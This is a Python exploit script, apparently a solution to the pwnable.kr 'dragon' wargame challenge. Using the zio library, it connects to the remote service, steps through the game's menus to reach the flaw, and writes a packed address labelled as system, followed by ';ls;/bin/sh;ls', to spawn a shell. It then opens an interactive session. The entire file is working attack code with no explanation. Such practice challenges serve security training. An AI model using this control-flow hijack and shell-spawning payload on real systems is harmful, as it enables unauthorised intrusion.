from zio import *
import struct

target = "./dragon"
target = ("pwnable.kr", 9004)

def get_io(target):
	io = zio(target, timeout = 9999)
	return io

def pwn(io):

	raw_input(":")
	io.read_until("[ 2 ] Knight\n")
	io.write("1\n1\n1\n")

	io.read_until("[ 2 ] Knight\n")
	io.write("1\n")
	for i in range(4):
		io.write("3\n3\n2\n")
	io.read_until("Remember You As:\n")
	system_addr = struct.pack("I", 0x08048530)
	shellcode = system_addr + ";ls;/bin/sh;ls"
	io.write(shellcode + "\n")
	io.interact(shellcode)


io = get_io(target)
pwn(io)